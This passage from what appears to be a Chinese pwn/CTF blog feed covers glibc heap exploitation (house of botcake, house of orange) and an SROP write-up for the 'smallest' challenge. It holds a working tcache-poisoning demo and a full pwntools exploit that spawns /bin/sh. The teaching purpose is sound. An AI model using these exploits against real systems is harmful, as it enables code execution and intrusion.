class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实很简单，也是利用了double free不过第一次free是将a丢进了unsorted bin当中，然后第二次free将a丢进了tcache，然后利用unsorted bin当中的chunk去修改tcache中的fd指针。</p><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>这一攻击手法只是用于glibc2.27及一下，因为其中存在unsorted bin attack</p><p>其实这一攻击手法也是非常简单，主要适用于程序当中不存在free的时候形成一个unsorted bin chunk然后经过unsorted bin attack进行FSOP</p><p>因为涉及到的源码过多我这里只贴部分就行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br></pre></td></tr></table></figure><p>首先我们肯定是不想进行mmap来新增堆空间的，所以我们不能大于他的阀值(0x2000)，其次我们如果要扩展top chunk需要绕过这几条判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>可以看到存在两个assert，第一个assert我们很好绕过，只需要保留top chunk的后三位即可保留，第二个则是我们申请的size大于top chunk的size。</p><p>因为没找到poc我就自己写了一个，其实也是很简单的，很好就可以想到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">intptr_t</span> *fp;</span><br><span class="line">    fp = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *top;</span><br><span class="line">    top = fp + <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;the top chunk starts at %p;\n&quot;</span>, top);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;the size of top chunk is %#lx;\n&quot;</span>, *(top + <span class="number">1</span>));</span><br><span class="line">    *(top + <span class="number">1</span>) = <span class="number">0xd91</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now,the top chunk is inserted the unsorted bin\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://github.com/shellphish/how2heap" >https://github.com/shellphish/how2heap<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.anquanke.com/post/id/218887" >https://www.anquanke.com/post/id/218887<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;没错！标题的星号就是脏字！&lt;/p&gt;
&lt;h2 id=&quot;house-of-force&quot;&gt;&lt;a href=&quot;#house-of-force&quot; class=&quot;headerlink&quot; title=&quot;house of force&quot;&gt;&lt;/a&gt;house of force&lt;/h2&gt;&lt;p&gt;这</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
    <category term="house of force" scheme="https://cv196082.gitee.io/tags/house-of-force/"/>
    
    <category term="house of lora" scheme="https://cv196082.gitee.io/tags/house-of-lora/"/>
    
    <category term="house of botcake" scheme="https://cv196082.gitee.io/tags/house-of-botcake/"/>
    
    <category term="house of orange" scheme="https://cv196082.gitee.io/tags/house-of-orange/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://cv196082.gitee.io/2022/03/01/SROP/"/>
    <id>https://cv196082.gitee.io/2022/03/01/SROP/</id>
    <published>2022-03-01T08:03:27.000Z</published>
    <updated>2022-03-01T08:20:03.126Z</updated>
    
    <content type="html"><![CDATA[<p>在做题之前一直认为SROP是一项比较难以理解的东西，做了之后发现并不是那么回事，原理的话我推荐<a class="link"   href="https://www.anquanke.com/post/id/217081" >这个博主<i class="fas fa-external-link-alt"></i></a>，我这里就不在赘述了。</p><p>题目:2016年-360春秋杯-srop赛题smallest        buu上面也有</p><p>题目就是裸奔，除了堆栈不可执行都没开</p><p>题目的代码也很简单，就在start存在</p><p><img src="/images/image-20220301160806071.png" alt="image-20220301160806071"></p><p>我对于这个东西的理解：在调用sys_rt_sigreturn时，会将rsp所指向的位置当作sigFrame，以至于我们可以随便伪造sigFrame</p><p>在实行SROP攻击的时候需要知道的几个条件：需要泄漏出一个栈地址，需要知道syscall的地址，需要控制rax</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.send(p64(start_addr)*<span class="number">3</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;\xb3&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x8</span>)</span><br><span class="line">stack_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p>首先泄漏栈地址，从上图可以看到start_addr=0x4000b0，我们首先写入三个start的地址到栈里面，然后进行下一个read，我们输入b’\xb3’，那么这时候我们将我们写入的第二个start地址改成了0x4000b3，并且此时的rax为1，所以下一次就会输出0x400个栈上面的内容，借机泄漏栈地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line">r.send(payload)</span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">0xf</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure><p>在第三个read的时候我们写入start的地址和伪造的sigframe，接着进入第四次read，随后写入syscall地址，然后补齐0xf个字节，然后就会执行sys_rt_sigreturn，并且此时的rsp正好指向了我们伪造的sigframe。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bin_sh_addr = stack_addr+<span class="number">0x120</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">0xf</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure><p>此时，在执行完之后就会进入第五次read，此次read是我们构造的，所以rsi在我们已知的栈地址上面写入内容，所以使用同样的方法构造出execve。</p><h3 id="综上得出exp"><a href="#综上得出exp" class="headerlink" title="综上得出exp"></a>综上得出exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line">syscall_addr = <span class="number">0x4000BE</span></span><br><span class="line"></span><br><span class="line">r.send(p64(start_addr)*<span class="number">3</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;\xb3&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x8</span>)</span><br><span class="line">stack_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line">r.send(payload)</span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">0xf</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = stack_addr+<span class="number">0x120</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">0xf</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在做题之前一直认为SROP是一项比较难以理解的东西，做了之后发现并不是那么回事，原理的话我推荐&lt;a class=&quot;link&quot;   href=&quot;https://www.anquanke.com/post/id/217081&quot; &gt;这个博主&lt;i class=&quot;fas fa-ext</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="SROP" scheme="https://cv196082.gitee.io/tags/SROP/"/>
    
  </entry>
  
  <entry>
    <title>house of pig</title>
    <link href="https://cv196082.gitee.io/2022/03/01/house-of-pig/"/>
    <id>https://cv196082.gitee.io/2022/03/01/house-of-pig/</id>
    <published>2022-03-01T02:14:26.000Z</published>
    <updated>2022-03-07T04:53:54.789Z</updated>
    
    <content type="html"><![CDATA[<p>在最近做题的过程中发现自己的逆向能力很是欠缺，在梳理程序的逻辑的时候总是会梳理不清，尤其是程序当中存在复杂的结构体时或则存在cpp代码时，脑子就像有浆糊一样，后续会针对自己的逆向能力下手多练习相关题目。</p><h2 id="ida恢复跳表"><a href="#ida恢复跳表" class="headerlink" title="ida恢复跳表"></a>ida恢复跳表</h2><p>首先看到main函数存在这样一句</p><p><img src="/images/image-20220301101946273.png" alt="image-20220301101946273"></p><p>看不懂就直接看汇编。</p><p><img src="/images/image-20220301102019688.png" alt="image-20220301102019688"></p><p>可以看出来其实这里是一个类似与switch的语句。只不过ida没有翻译过来。</p><p>恢复的办法就是在IDA的edit当中的other里用Specify switch idiom</p><p><img src="/images/image-20220301102326958.png" alt="image-20220301102326958"></p><blockquote><ul><li>Address of Jump table：设置成 jump table 的地址</li><li>Number of elements：设置为 jump table 中存在的元素总数</li><li>Size of table element：设置为 jump table 中元素的类型</li><li>Element shift amount：这个一般情况下都是零，和跳表计算时的方式有关，比如此题只是单纯的跳表地址加跳表中的元素，那么就不需要移位</li><li>Element base value：设置为计算跳转地址时给跳表元素加的值，比如此题的计算方法为 <code>&amp;unk_69E0 + unk_69E0[i]</code>，那么这里就应该填跳表的地址</li><li>Start of the switch idiom：这个默认就行，就是获取跳表值的语句的地址</li><li>Input register of switch：设置为用于给跳表寻址的寄存器</li><li>First(lowest) input value：就是 switch 的最小值了</li><li>Default jump address：也就是 default 的跳转位置，其实有时候可以不填，但是最好还是填上，这个一般在上方不远处的 cmp 指令附近，特征就是判断了输入，然后跳转到某个地址上，跳转的这个地址就是要填的值了</li></ul></blockquote><p>以上是各参数的意义</p><p><img src="/images/image-20220301102916881.png" alt="image-20220301102916881"></p><p>最终填写的结果是这样。</p><p><img src="/images/image-20220301102933410.png" alt="image-20220301102933410"></p><p>最终呈现的结果是这样。</p><h2 id="在Glibc2-31下的FSOP"><a href="#在Glibc2-31下的FSOP" class="headerlink" title="在Glibc2.31下的FSOP"></a>在Glibc2.31下的FSOP</h2><p>在以前纯粹讲解FSOP的时候发现的问题是，在2.29时的_IO_str_overflow函数就没有了用变量当作函数来调用，但是源码中还存在这样一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *new_buf;</span><br><span class="line"><span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (old_buf)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">    <span class="built_in">free</span> (old_buf);</span><br><span class="line">    <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">    fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span 